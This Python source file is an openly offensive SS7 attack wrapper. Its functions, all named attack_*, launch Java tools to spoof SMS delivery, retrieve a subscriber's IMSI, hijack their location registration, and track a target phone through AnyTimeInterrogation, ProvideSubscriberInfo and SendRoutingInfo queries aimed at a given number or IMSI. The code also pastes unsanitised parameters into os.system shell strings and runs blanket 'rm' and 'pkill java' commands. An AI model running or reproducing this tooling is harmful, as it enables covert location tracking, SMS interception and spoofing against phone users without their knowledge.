import os
import subprocess as sp

ipinng: str = str(sp.getoutput('ip address'))

def attack_MTForwardSMSResp(client_ip,client_port,server_ip,server_port,Network_Indicator,Target_MSC,Target_IMSI,locael_GT,SMSC_GT,Sender_Name,SMS_Content):
    p0 = os.system("rm *.xml")
    p0 = os.system("rm outingss7.txt")

    
    if(client_ip not in ipinng):
        os.system("ip address add "+client_ip+" dev lo")
    if(server_ip not in ipinng):
        os.system("ip address add "+server_ip+" dev lo")
     

    p=os.system("java -jar ./mtsms/MTForwardSMS.jar 1 2 "+" "+client_ip+" "+ client_port+" "+ server_ip+" "+ server_port+" "+Network_Indicator+" "+Target_IMSI+" "+Target_MSC+" "+locael_GT+" "+SMSC_GT+" "+Sender_Name+" "+SMS_Content)
    p2 = os.system("pkill java")

def attack_SendIMSI(client_ip,client_port,server_ip,server_port,Network_Indicator,Targer_MSISDN,locael_GT):
    p0 = os.system("rm *.xml")
    p0 = os.system("rm outingss7.txt")

    
    if(client_ip not in ipinng):
        os.system("ip address add "+client_ip+" dev lo")
    if(server_ip not in ipinng):
        os.system("ip address add "+server_ip+" dev lo")
      

    p=os.system("java -jar ./simsi/SendIMSI.jar 1 2 "+" "+client_ip+" "+ client_port+" "+ server_ip+" "+ server_port+" "+Network_Indicator+" "+locael_GT+" "+Targer_MSISDN)
    p2 = os.system("pkill java")

def attack_UpdateLocation(client_ip,client_port,server_ip,server_port,Network_Indicator,Target_IMSI,Targer_IMSI_MGT,locael_GT,locael_vlr):
    p0 = os.system("rm *.xml")
    p0 = os.system("rm outingss7.txt")

    
    if(client_ip not in ipinng):
        os.system("ip address add "+client_ip+" dev lo")
    if(server_ip not in ipinng):
        os.system("ip address add "+server_ip+" dev lo")
    


    p=os.system("java -jar ./UpdateLocation/UpdateLocation.jar 1 2 "+" "+client_ip+" "+ client_port+" "+ server_ip+" "+ server_port+" "+Network_Indicator+" "+Target_IMSI+" "+Targer_IMSI_MGT+" "+locael_GT+" "+locael_vlr+" n")
    p2 = os.system("pkill java")

def attack_tracking_AnyTimeInterrogation(client_ip,client_port,server_ip,server_port,Network_Indicator,Targer_MSISDN,locael_GT):
    p0 = os.system("rm *.xml")
    p0 = os.system("rm outingss7.txt")

    
    if(client_ip not in ipinng):
        os.system("ip address add "+client_ip+" dev lo")
    if(server_ip not in ipinng):
        os.system("ip address add "+server_ip+" dev lo")
      
    p=os.system("java -jar ./tracking/ati/AnyTimeInterrogation.jar 1 2 "+" "+client_ip+" "+ client_port+" "+ server_ip+" "+ server_port+" "+Network_Indicator+" "+Targer_MSISDN+" "+locael_GT)
    p2 = os.system("pkill java")

def attack_tracking_ProvideSubscriberInfo(client_ip,client_port,server_ip,server_port,Network_Indicator,Targer_MSISDN,Targer_HLR,Targer_IMSI):
    p0 = os.system("rm *.xml")
    p0 = os.system("rm outingss7.txt")

   
    if(client_ip not in ipinng):
        os.system("ip address add "+client_ip+" dev lo")
    if(server_ip not in ipinng):
        os.system("ip address add "+server_ip+" dev lo")

     

    p=os.system("java -jar ./tracking/psi/ProvideSubscriberInfo.jar 1 2 "+" "+client_ip+" "+ client_port+" "+ server_ip+" "+ server_port+" "+Network_Indicator+" "+Targer_MSISDN+" "+Targer_IMSI+" "+Targer_HLR)
    p2 = os.system("pkill java")

def attack_tracking_SendRoutingInfo(client_ip,client_port,server_ip,server_port,Network_Indicator,Targer_MSISDN,locael_MSC):
    p0 = os.system("rm *.xml")
    p0 = os.system("rm outingss7.txt")

    
    if(client_ip not in ipinng):
        os.system("ip address add "+client_ip+" dev lo")
    if(server_ip not in ipinng):
        os.system("ip address add "+server_ip+" dev lo")
     
    

    p=os.system("java -jar ./tracking/sri/SendRoutingInfo.jar 1 2 "+" "+client_ip+" "+ client_port+" "+ server_ip+" "+ server_port+" "+Network_Indicator+" "+Targer_MSISDN+" "+locael_MSC)
    p2 = os.system("pkill java")

def attack_tracking_SendRoutingInfoForGPRS(client_ip,client_port,server_ip,server_port,Network_Indicator,Targer_IMSI,Targer_HLR,Targer_GGSN):
    p0 = os.system("rm *.xml")
    p0 = os.system("rm outingss7.txt")

    
    if(client_ip not in ipinng):
        os.system("ip address add "+client_ip+" dev lo")
    if(server_ip not in ipinng):
        os.system("ip address add "+server_ip+" dev lo")
     
    

    p=os.system("java -jar ./tracking/srigprs/SendRoutingInfoForGPRS.jar 1 2 "+" "+client_ip+" "+ client_port+" "+ server_ip+" "+ server_port+" "+Network_Indicator+" "+Targer_IMSI+" "+Targer_HLR+" "+Targer_GGSN)
    p2 = os.system("pkill java")

def attack_tracking_SendRoutingInfoForSM(client_ip,client_port,server_ip,server_port,Network_Indicator,Targer_HLR,Targer_MSISDN,Targer_MSC,Targer_SMSC):
    p0 = os.system("rm *.xml")
    p0 = os.system("rm outingss7.txt")

    
    if(client_ip not in ipinng):
        os.system("ip address add "+client_ip+" dev lo")
    if(server_ip not in ipinng):
        os.system("ip address add "+server_ip+" dev lo")
      


    p=os.system("java -jar ./tracking/srism/SendRoutingInfoForSM.jar 1 2 "+" "+client_ip+" "+ client_port+" "+ server_ip+" "+ server_port+" "+Network_Indicator+" "+Targer_MSISDN+" "+Targer_HLR+" "+Targer_MSC+" "+Targer_SMSC)
    p2 = os.system("pkill java")